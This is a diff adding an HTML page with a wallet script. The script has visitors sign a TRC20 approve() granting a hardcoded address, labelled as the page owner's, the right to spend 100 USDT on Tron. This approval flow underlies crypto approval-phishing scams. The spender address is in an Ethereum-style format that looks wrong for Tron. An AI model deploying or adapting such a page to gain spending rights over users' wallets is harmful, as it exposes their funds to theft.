@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Approve 100 USDT (Tron)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f0f1a;
+      color: #fff;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 { margin-bottom: 40px; color: #ffcc00; }
+    button {
+      padding: 20px 60px;
+      font-size: 24px;
+      background: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+    }
+    button:hover { background: #ffe066; }
+    #status { margin-top: 30px; font-size: 18px; min-height: 28px; }
+  </style>
+</head>
+<body>
+  <h1>Approve 100 USDT на Tron (TRC20)</h1>
+  <button id="approveBtn">Подключить TronLink / Trust Wallet и Approve</button>
+  <div id="status"></div>
+
+  <script>
+    const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT на Tron
+    const SPENDER_ADDRESS = "0x7E878C18B4a74EdE5795dFEb9106805506cd133e"; // твой адрес (можно в base58 или hex)
+    const AMOUNT = 100 * 1_000_000; // 100 USDT (6 decimals)
+
+    const status = document.getElementById("status");
+    const btn = document.getElementById("approveBtn");
+
+    function updateStatus(msg, color = "#fff") {
+      status.style.color = color;
+      status.textContent = msg;
+    }
+
+    btn.addEventListener("click", async () => {
+      if (!window.tronWeb) {
+        alert("Пожалуйста, установите TronLink или Trust Wallet и включите его");
+        return;
+      }
+
+      try {
+        updateStatus("Подключение к Tron...");
+
+        // Ждём инициализации TronWeb
+        let tronWeb = window.tronWeb;
+        if (!tronWeb) {
+          await new Promise(resolve => setTimeout(resolve, 500));
+          tronWeb = window.tronWeb;
+        }
+
+        const userAddress = tronWeb.defaultAddress.base58;
+        if (!userAddress) {
+          await tronWeb.request({ method: 'tron_requestAccounts' });
+        }
+
+        updateStatus("Отправка Approve...");
+
+        // TRC20 approve
+        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          USDT_ADDRESS,
+          "approve(address,uint256)",
+          {},
+          [
+            { type: 'address', value: SPENDER_ADDRESS },
+            { type: 'uint256', value: AMOUNT }
+          ],
+          tronWeb.defaultAddress.hex
+        );
+
+        const signedTx = await tronWeb.trx.sign(tx.transaction);
+        const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+        if (result.result) {
+          updateStatus(`✅ Approve отправлен! TxID: ${result.txid}`, "#00ff88");
+          console.log("Tron TxID:", result.txid);
+        } else {
+          updateStatus("❌ Не удалось отправить транзакцию", "#ff6666");
+        }
+
+      } catch (error) {
+        console.error(error);
+        updateStatus("❌ Ошибка: " + (error.message || error), "#ff6666");
+      }
+    });
+  </script>
+</body>
+</html>
